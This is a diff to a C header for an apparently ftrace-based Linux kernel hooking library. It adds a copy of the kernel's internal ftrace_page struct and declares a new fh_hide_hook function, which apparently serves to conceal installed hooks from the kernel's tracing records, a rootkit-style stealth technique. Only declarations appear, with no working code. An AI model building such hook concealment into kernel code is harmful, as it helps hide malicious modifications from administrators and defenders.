@@ -32,9 +32,17 @@ struct ftrace_hook {
     struct ftrace_ops ops;
 };
 
+struct ftrace_page {
+        struct ftrace_page      *next;
+        struct dyn_ftrace       *records;
+        int                     index;
+        int                     order;
+};
+
 int  fh_resolve_hook_address(struct ftrace_hook *hook);
 void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                               struct ftrace_ops *ops, struct pt_regs *regs);
+int fh_hide_hook(struct ftrace_hook *hook);
 int  fh_install_hook(struct ftrace_hook *hook);
 void fh_remove_hook(struct ftrace_hook *hook);
 int  fh_install_hooks(struct ftrace_hook *hooks, size_t count);
